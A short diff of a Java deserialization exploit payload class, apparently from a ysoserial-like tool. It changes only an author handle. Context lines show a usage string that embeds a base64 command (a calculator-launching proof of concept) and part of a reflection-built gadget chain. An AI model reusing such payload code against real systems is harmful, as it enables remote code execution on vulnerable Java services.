@@ -42,7 +42,7 @@ import static java.lang.Class.forName;
  * 利用方式：
  * SignedObject 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:10000'
  *
- * @author nu1r
+ * @author QI4L
  */
 public class signedobject implements ObjectPayload<Object> {
 
@@ -186,7 +186,7 @@ public class signedobject implements ObjectPayload<Object> {
         ScriptableObject initContextScriptableObject = new Environment();
         Method           makeSlot                    = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
         Reflections.setAccessible(makeSlot);
-        Object slot = makeSlot.invoke(initContextScriptableObject, "nu1r", 0, 4);
+        Object slot = makeSlot.invoke(initContextScriptableObject, "QI4L", 0, 4);
         Reflections.setFieldValue(slot, "getter", initContextMemberBox);
         NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
         Reflections.setFieldValue(initContextNativeJavaObject, "parent", dummyScope);
